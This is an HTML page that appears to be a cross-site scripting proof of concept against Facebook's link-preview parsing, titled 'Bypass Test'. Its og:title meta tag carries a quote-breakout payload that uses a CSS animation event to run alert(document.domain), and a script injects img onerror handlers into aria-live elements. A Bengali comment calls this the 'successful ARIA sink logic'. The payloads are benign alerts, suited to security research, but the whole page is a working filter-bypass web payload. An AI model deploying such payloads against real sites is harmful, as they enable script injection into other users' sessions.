<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="fb:app_id" content="966242223397117">
    <meta property="og:url" content="https://xsstestfb.vercel.app/">
    <meta property="og:type" content="website">
    <meta property="og:description" content="Verified security researcher content.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">

    <meta property="og:title" content="Verified &#x22;><style>@keyframes x{}</style><img style='animation-name:x' onanimationstart='alert(document.domain)'>">

    <title>Bypass Test</title>
</head>
<body>
    <script>
        // তোমার সেই সফল হওয়া ARIA Sink লজিক
        setInterval(() => {
            const sinks = document.querySelectorAll('[aria-live="assertive"]');
            sinks.forEach(s => {
                if(!s.dataset.x) {
                    s.dataset.x = "1";
                    const i = document.createElement('img');
                    i.src = 'x';
                    i.onerror = () => { alert('XSS_Confirmed'); };
                    s.appendChild(i);
                }
            });
        }, 500);
    </script>
</body>
</html>
